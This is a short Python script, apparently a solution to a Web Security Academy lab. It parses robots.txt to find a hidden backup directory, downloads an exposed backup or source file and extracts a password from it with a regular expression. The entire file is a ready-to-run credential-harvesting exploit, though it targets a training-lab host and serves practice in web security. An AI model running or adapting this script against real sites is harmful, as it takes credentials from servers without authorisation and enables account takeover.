import requests
from bs4 import BeautifulSoup
import re

site = "0a61009003852fb181f0f3130037000d.web-security-academy.net"  # ← Replace with your actual lab instance
base_url = f"https://{site}"
s = requests.Session()

# Step 1: Access robots.txt to find backup paths
robots_url = f"{base_url}/robots.txt"
resp = s.get(robots_url)
disallowed = [line.split(":")[1].strip() for line in resp.text.splitlines() if "Disallow" in line]

backup_path = next((path for path in disallowed if "backup" in path), None)
if not backup_path:
    print("[!] No backup directory found in robots.txt.")
    exit(1)

print(f"[*] Found disallowed path: {backup_path}")

# Step 2: Look inside backup directory
backup_index_url = f"{base_url}{backup_path}"
resp = s.get(backup_index_url)
soup = BeautifulSoup(resp.text, "html.parser")

backup_file_link = None
for link in soup.find_all("a", href=True):
    if ".bak" in link["href"] or ".java" in link["href"]:
        backup_file_link = link["href"]
        break

if not backup_file_link:
    print("[!] No backup file found.")
    exit(1)

# Step 3: Fetch the backup file
file_url = f"{base_url}{backup_file_link}"
resp = s.get(file_url)
lines = resp.text.splitlines()

# Step 4: Search for the password in the entire file
password = None
for i, line in enumerate(lines):
    if "password" in line.lower():
        print(f"[✓] Password line found (line {i+1}):")
        print(line.strip())
        password_match = re.search(r'password\s*=\s*["\']?([a-zA-Z0-9@#_!$%^&*]+)["\']?', line, re.IGNORECASE)
        if password_match:
            password = password_match.group(1)
            print(f"[✓] Extracted password: {password}")
        else:
            print("[!] Line found but no password extracted.")
        break

if not password:
    print("[!] No password found in backup file.")
    print("--- File Preview (first 40 lines) ---")
    print("\n".join(lines[:40]))
